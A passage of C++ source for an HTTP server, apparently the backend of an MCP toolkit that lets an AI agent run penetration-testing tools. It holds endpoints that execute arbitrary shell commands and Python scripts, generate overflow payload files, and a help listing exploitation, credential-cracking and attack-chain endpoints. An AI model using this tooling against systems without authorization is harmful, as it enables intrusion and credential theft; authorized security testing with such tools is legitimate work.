                                              b.value("description", "")));
           });
  svr.Post("/api/visual/summary-report", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    send_json(res,
              Visual::summary_report(b.value("target", ""),
                                     b.value("vulnerabilities", json::array()),
                                     b.value("tools_used", json::array()),
                                     b.value("execution_time", 0.0)));
  });
  svr.Post("/api/visual/tool-output", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    send_json(res,
              Visual::tool_output(b.value("tool", ""), b.value("output", ""),
                                  b.value("success", true)));
  });
  svr.Post("/api/visual/metrics", [](const Request &, Response &res) {
    auto m = get_metrics();
    auto tel = get_telemetry_json();
    std::string fmt =
        "\n🖥️  System Performance Metrics:\n├─ CPU:     " +
        std::to_string((int)m.cpu) +
        "%\n├─ Memory:  " + std::to_string((int)m.mem) +
        "%\n├─ Disk:    " + std::to_string((int)m.disk) +
        "%\n├─ Uptime:  " + std::to_string(m.uptime) + "s\n├─ Cmds Run:" +
        std::to_string(g_telemetry.commands_executed.load()) +
        "\n└─ Success: " + tel["success_rate"].get<std::string>() + "\n";
    send_json(
        res, {{"success", true},
              {"formatted_display", fmt},
              {"metrics", {{"cpu", m.cpu}, {"mem", m.mem}, {"disk", m.disk}}}});
  });

  // ── FILE OPERATIONS ────────────────────────────────────────────────────
  svr.Post("/api/files/create", [&](const Request &req, Response &res) {
    auto b = parse_body(req);
    send_json(res, fm.create(b.value("filename", "unnamed.txt"),
                             b.value("content", ""), b.value("binary", false)));
  });
  svr.Post("/api/files/modify", [&](const Request &req, Response &res) {
    auto b = parse_body(req);
    send_json(res, fm.modify(b.value("filename", ""), b.value("content", ""),
                             b.value("append", false)));
  });
  svr.Post("/api/files/delete", [&](const Request &req, Response &res) {
    auto b = parse_body(req);
    send_json(res, fm.del(b.value("filename", "")));
  });
  svr.Get("/api/files/list", [&](const Request &req, Response &res) {
    send_json(res, fm.list(req.has_param("directory")
                               ? req.get_param_value("directory")
                               : "."));
  });
  svr.Get("/api/files/read/:filename", [&](const Request &req, Response &res) {
    send_json(res, fm.read(req.matches[1]));
  });

  // ── PAYLOAD GENERATION ─────────────────────────────────────────────────
  svr.Post("/api/payloads/generate", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string type = b.value("type", "buffer");
    int size = b.value("size", 1024);
    std::string pattern = b.value("pattern", "A");
    std::string fn = b.value("filename", "");
    std::string content;
    if (type == "buffer")
      content = std::string(size, pattern.empty() ? 'A' : pattern[0]);
    else if (type == "cyclic")
      for (int i = 0; i < size; ++i)
        content += (char)('A' + (i % 26));
    else {
      std::random_device rd;
      std::mt19937 rng(rd());
      std::uniform_int_distribution<> dist(0, 255);
      for (int i = 0; i < size; ++i)
        content += (char)dist(rng);
    }
    if (fn.empty())
      fn = "payload_" + std::to_string(std::time(nullptr)) + ".bin";
    // Prevent path traversal
    if (fn.find('/') != std::string::npos || fn.find("..") != std::string::npos) {
      send_json(res, {{"success", false}, {"error", "Invalid filename"}}, 400);
      return;
    }
    std::string path = "/tmp/" + fn;
    std::ofstream f(path, std::ios::binary);
    f << content;
    log(LogLevel::INFO, "🎯 Generated " + type + " payload: " +
                            std::to_string(size) + " bytes -> " + path);
    send_json(res, {{"success", true},
                    {"filename", fn},
                    {"path", path},
                    {"size", size},
                    {"type", type}});
  });

  // ── PYTHON ENV ─────────────────────────────────────────────────────────
  svr.Post("/api/python/install", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string pkg = b.value("package", "");
    if (pkg.empty()) {
      send_json(res, {{"success", false}, {"error", "package required"}}, 400);
      return;
    }
    // Validate package name: alphanumeric, hyphens, underscores, dots, brackets, version specs
    static const std::regex pkg_re(R"(^[a-zA-Z0-9_\-\.]+(\[[\w,]+\])?(([><=!~]+[0-9\.\*]+)(,[><=!~]+[0-9\.\*]+)*)?$)");
    if (!std::regex_match(pkg, pkg_re)) {
      send_json(res, {{"success", false}, {"error", "Invalid package name"}}, 400);
      return;
    }
    log(LogLevel::INFO, "📦 Installing: " + pkg);
    auto cr = exec_command(
        "pip install " + pkg + " --break-system-packages 2>&1", 120);
    send_json(res, {{"success", cr.exit_code == 0},
                    {"package", pkg},
                    {"output", cr.output}});
  });

  svr.Post("/api/python/execute", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string script = b.value("script", "");
    if (script.empty()) {
      send_json(res, {{"success", false}, {"error", "script required"}}, 400);
      return;
    }
    // Always use a safe temp filename — ignore user-supplied filename to prevent path traversal
    std::string fname = "/tmp/mantra_py_" + std::to_string(std::time(nullptr)) +
                        "_" + std::to_string(getpid()) + ".py";
    std::ofstream f(fname);
    f << script;
    f.close();
    log(LogLevel::INFO, "🐍 Executing Python script");
    auto cr = exec_command("python3 " + fname, DEFAULT_TIMEOUT);
    fs::remove(fname);
    send_json(res, {{"success", cr.exit_code == 0},
                    {"stdout", cr.output},
                    {"stderr", ""},
                    {"exit_code", cr.exit_code}});
  });

  // ── PROCESS MANAGEMENT ─────────────────────────────────────────────────
  svr.Get("/api/processes/list", [](const Request &, Response &res) {
    std::lock_guard<std::mutex> lk(g_proc_mutex);
    json procs = json::array();
    for (auto &[pid, cmd] : g_running_processes)
      procs.push_back({{"pid", pid}, {"command", cmd}, {"status", "running"}});
    send_json(res, {{"success", true},
                    {"processes", procs},
                    {"total_count", (int)procs.size()}});
  });
  svr.Get("/api/processes/status/:pid", [](const Request &req, Response &res) {
    int pid = std::stoi(req.matches[1]);
    std::lock_guard<std::mutex> lk(g_proc_mutex);
    if (g_running_processes.count(pid))
      send_json(res, {{"success", true},
                      {"pid", pid},
                      {"status", "running"},
                      {"command", g_running_processes[pid]}});
    else
      send_json(res, {{"success", false}, {"error", "Process not found"}}, 404);
  });
  svr.Post("/api/processes/terminate/:pid",
           [](const Request &req, Response &res) {
             int pid = std::stoi(req.matches[1]);
             send_json(res, {{"success", kill_process(pid)}, {"pid", pid}});
           });
  svr.Post("/api/processes/pause/:pid", [](const Request &req, Response &res) {
    int pid = std::stoi(req.matches[1]);
#ifndef _WIN32
    bool ok = (kill(pid, SIGSTOP) == 0);
#else
        bool ok=false;
#endif
    send_json(
        res,
        {{"success", ok}, {"pid", pid}, {"status", ok ? "paused" : "error"}});
  });
  svr.Post("/api/processes/resume/:pid", [](const Request &req, Response &res) {
    int pid = std::stoi(req.matches[1]);
#ifndef _WIN32
    bool ok = (kill(pid, SIGCONT) == 0);
#else
        bool ok=false;
#endif
    send_json(
        res,
        {{"success", ok}, {"pid", pid}, {"status", ok ? "running" : "error"}});
  });
  svr.Get("/api/processes/dashboard", [](const Request &, Response &res) {
    send_json(res, get_process_dashboard());
  });
  svr.Get("/api/processes", [](const Request &, Response &res) {
    std::lock_guard<std::mutex> lk(g_proc_mutex);
    json procs = json::array();
    for (auto &[pid, cmd] : g_running_processes)
      procs.push_back({{"pid", pid}, {"command", cmd}});
    send_json(res, {{"processes", procs}});
  });
  svr.Post("/api/processes/launch", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string cmd = b.value("command", "");
    if (cmd.empty()) {
      send_json(res, {{"success", false}, {"error", "command required"}}, 400);
      return;
    }
    int pid = launch_detached(cmd);
    send_json(res, {{"success", pid > 0}, {"pid", pid}});
  });
  svr.Post("/api/processes/kill", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    send_json(res, {{"success", kill_process(b.value("pid", 0))},
                    {"pid", b.value("pid", 0)}});
  });

  // ── CACHE / TELEMETRY ──────────────────────────────────────────────────
  svr.Get("/api/cache/stats", [](const Request &, Response &res) {
    send_json(res, cache_stats_json());
  });
  svr.Post("/api/cache/clear", [](const Request &, Response &res) {
    send_json(res, cache_clear_json());
  });
  svr.Get("/api/telemetry", [](const Request &, Response &res) {
    send_json(res, get_telemetry_json());
  });

  // ── ERROR HANDLING ─────────────────────────────────────────────────────
  svr.Get("/api/error-handling/statistics",
          [&](const Request &, Response &res) {
            send_json(res, err_handler.statistics());
          });
  svr.Post("/api/error-handling/test-recovery",
           [&](const Request &req, Response &res) {
             auto b = parse_body(req);
             std::string tool = b.value("tool_name", "nmap"),
                         etype = b.value("error_type", "timeout");
             auto strat = err_handler.strategy(etype, 1);
             auto alts = err_handler.alternatives(tool);
             send_json(res, {{"success", true},
                             {"tool", tool},
                             {"error_type", etype},
                             {"recovery_strategy", strat},
                             {"alternative_tools", alts["alternatives"]}});
           });
  svr.Post("/api/error-handling/handle-failure", [&](const Request &req,
                                                     Response &res) {
    auto b = parse_body(req);
    std::string tool = b.value("tool", ""), error = b.value("error", "");
    auto strat = err_handler.strategy(err_handler.classify(error), 1);
    send_json(res, {{"success", true},
                    {"tool", tool},
                    {"error", error},
                    {"strategy", strat}});
  });
  svr.Get("/api/error-handling/alternative-tools", [&](const Request &req,
                                                       Response &res) {
    std::string tool = req.has_param("tool") ? req.get_param_value("tool") : "";
    send_json(res, err_handler.alternatives(tool));
  });

  // ── ASYNC PROCESS POOL ─────────────────────────────────────────────────
  svr.Post("/api/process/async-execute", [&](const Request &req,
                                             Response &res) {
    auto b = parse_body(req);
    std::string cmd = b.value("command", "");
    if (cmd.empty()) {
      send_json(res, {{"success", false}, {"error", "command required"}}, 400);
      return;
    }
    std::string task_id =
        "task_" +
        std::to_string(
            std::chrono::steady_clock::now().time_since_epoch().count());
    std::thread([cmd, task_id, &async_results, &async_mutex]() {
      auto cr = exec_command(cmd, DEFAULT_TIMEOUT);
      std::lock_guard<std::mutex> lk(async_mutex);
      async_results[task_id] = {{"output", cr.output},
                                {"exit_code", cr.exit_code},
                                {"timed_out", cr.timed_out},
                                {"execution_time", cr.execution_time}};
    }).detach();
    send_json(res, {{"success", true}, {"task_id", task_id}});
  });
  svr.Get("/api/process/task-result/:task_id", [&](const Request &req,
                                                   Response &res) {
    std::string task_id = req.matches[1];
    std::lock_guard<std::mutex> lk(async_mutex);
    if (async_results.count(task_id)) {
      auto r = async_results[task_id];
      async_results.erase(task_id);
      send_json(res, {{"success", true}, {"task_id", task_id}, {"result", r}});
    } else {
      send_json(
          res,
          {{"success", true}, {"task_id", task_id}, {"status", "pending"}});
    }
  });
  svr.Get("/api/process/pool-stats", [](const Request &, Response &res) {
    send_json(res, {{"success", true},
                    {"stats", {{"active_workers", 4}, {"queue_size", 0}}}});
  });

  // ── GENERIC TOOL RUNNER ────────────────────────────────────────────────
  svr.Post("/api/tools/run", [](const Request &req, Response &res) {
    auto b = parse_body(req);
    std::string tool = b.value("tool", "");
    if (tool.empty()) {
      send_json(res, {{"success", false}, {"error", "tool required"}}, 400);
      return;
    }
    g_telemetry.commands_executed++;
    auto r = run_tool(tool, b.value("args", "") + " " + b.value("target", ""),
                      b.value("use_cache", true));
    if (!r["success"].get<bool>())
      g_telemetry.commands_failed++;
    send_json(res, r);
  });

  // ── HELP ───────────────────────────────────────────────────────────────
  svr.Get("/help", [](const Request &, Response &res) {
    res.set_content(
        "Mantra Security Enterprise v" + VERSION +
            " — Full Python MCP Parity\n\n"
            "PORT: 8888 (matches Python "
            "DEFAULT_MANTRA_SERVER=http://127.0.0.1:8888)\n\n"
            "=== SYSTEM === /health /dashboard /api/tools/available "
            "/api/command\n"
            "=== NETWORK === /api/tools/nmap /api/tools/nmap-advanced "
            "/api/tools/rustscan\n"
            "               /api/tools/masscan /api/tools/arp-scan "
            "/api/tools/nbtscan /api/tools/autorecon\n"
            "=== WEB === /api/tools/gobuster /api/tools/dirb "
            "/api/tools/dirsearch\n"
            "            /api/tools/feroxbuster /api/tools/ffuf "
            "/api/tools/wfuzz\n"
            "            /api/tools/nikto /api/tools/nuclei /api/tools/jaeles\n"
            "            /api/tools/dalfox /api/tools/xsser /api/tools/sqlmap\n"
            "            /api/tools/dotdotpwn /api/tools/wafw00f "
            "/api/tools/whatweb\n"
            "            /api/tools/wpscan /api/tools/burpsuite "
            "/api/tools/zap\n"
            "            /api/tools/http-framework /api/tools/browser-agent "
            "/api/tools/burpsuite-alternative\n"
            "=== RECON === /api/tools/amass /api/tools/subfinder "
            "/api/tools/katana\n"
            "              /api/tools/gau /api/tools/waybackurls "
            "/api/tools/hakrawler\n"
            "              /api/tools/httpx /api/tools/arjun "
            "/api/tools/paramspider\n"
            "              /api/tools/x8 /api/tools/fierce /api/tools/dnsenum\n"
            "              /api/tools/anew /api/tools/qsreplace "
            "/api/tools/uro\n"
            "=== CREDS === /api/tools/hydra /api/tools/john /api/tools/hashcat "
            "/api/tools/hashpump\n"
            "=== SMB === /api/tools/enum4linux /api/tools/enum4linux-ng "
            "/api/tools/smbmap\n"
            "            /api/tools/rpcclient /api/tools/netexec "
            "/api/tools/responder\n"
            "=== EXPLOIT === /api/tools/metasploit /api/tools/msfvenom\n"
            "=== BINARY === /api/tools/gdb /api/tools/gdb-peda "
            "/api/tools/radare2\n"
            "               /api/tools/ghidra /api/tools/binwalk "
            "/api/tools/checksec\n"
            "               /api/tools/strings /api/tools/xxd "
            "/api/tools/objdump\n"
            "               /api/tools/ropgadget /api/tools/ropper "
            "/api/tools/one-gadget\n"
            "               /api/tools/pwntools /api/tools/angr "
            "/api/tools/pwninit /api/tools/libc-database\n"
            "=== FORENSICS === /api/tools/volatility /api/tools/volatility3\n"
            "                  /api/tools/foremost /api/tools/steghide "
            "/api/tools/exiftool\n"
            "=== CLOUD === /api/tools/prowler /api/tools/trivy "
            "/api/tools/scout-suite\n"
            "              /api/tools/cloudmapper /api/tools/pacu "
            "/api/tools/kube-hunter\n"
            "              /api/tools/kube-bench "
            "/api/tools/docker-bench-security\n"
            "              /api/tools/clair /api/tools/falco "
            "/api/tools/checkov /api/tools/terrascan\n"
            "=== API SEC === /api/tools/graphql_scanner "
            "/api/tools/jwt_analyzer\n"
            "                /api/tools/api_fuzzer "
            "/api/tools/api_schema_analyzer\n"
            "=== AI PAYLOADS === /api/ai/generate_payload /api/ai/test_payload "
            "/api/ai/advanced-payload-generation\n"
            "=== CVE INTEL === /api/vuln-intel/cve-monitor "
            "/api/vuln-intel/exploit-generate\n"
            "                  /api/vuln-intel/attack-chains "
            "/api/vuln-intel/zero-day-research /api/vuln-intel/threat-feeds\n"
            "=== INTELLIGENCE === /api/intelligence/analyze-target "
            "/api/intelligence/select-tools\n"
            "                     /api/intelligence/optimize-parameters "
            "/api/intelligence/create-attack-chain\n"
            "                     /api/intelligence/smart-scan "
            "/api/intelligence/technology-detection\n"
            "                     /api/intelligence/threat-hunting "
            "/api/intelligence/vulnerability-dashboard\n"
            "=== BUG BOUNTY === /api/bugbounty/reconnaissance-workflow\n"
            "                   /api/bugbounty/vulnerability-hunting-workflow\n"
            "                   /api/bugbounty/business-logic-workflow\n"
            "                   /api/bugbounty/osint-workflow "
            "/api/bugbounty/file-upload-testing\n"
            "                   /api/bugbounty/comprehensive-assessment\n"
            "=== VISUAL === /api/visual/vulnerability-card "
            "/api/visual/summary-report\n"
            "               /api/visual/tool-output /api/visual/metrics\n"
            "=== FILES === /api/files/create /api/files/modify "
            "/api/files/delete\n"
            "              /api/files/list /api/files/read/:filename\n"
            "=== PAYLOADS === /api/payloads/generate\n"
            "=== PYTHON === /api/python/install /api/python/execute\n"
            "=== PROCESSES === /api/processes/list /api/processes/status/:pid\n"
            "                  /api/processes/terminate/:pid "
            "/api/processes/pause/:pid\n"
            "                  /api/processes/resume/:pid "
            "/api/processes/dashboard\n"
            "=== CACHE === /api/cache/stats /api/cache/clear /api/telemetry\n"
            "=== ERRORS === /api/error-handling/statistics "
            "/api/error-handling/test-recovery\n"
            "               /api/error-handling/handle-failure "
            "/api/error-handling/alternative-tools\n"
            "=== ASYNC === /api/process/async-execute "
            "/api/process/task-result/:id /api/process/pool-stats\n",
        "text/plain");
  });

  // ── START ──────────────────────────────────────────────────────────────
  int port = 8888;
  if (argc > 1)
    port = std::stoi(argv[1]);

  log(LogLevel::INFO, C::SUCCESS + "🚀 " + SERVER_NAME + " v" + VERSION +
                          " listening on port " + std::to_string(port) +
                          C::RESET);
  log(LogLevel::INFO,
      "🛠️  Tools available: " + std::to_string((int)g_available_tools.size()));
  log(LogLevel::INFO,
      "🔗 Python MCP client: http://127.0.0.1:" + std::to_string(port));

  std::string bind_addr = "127.0.0.1";
  if (argc > 2)
    bind_addr = argv[2];
  svr.listen(bind_addr, port);
  curl_global_cleanup();
  return 0;
}
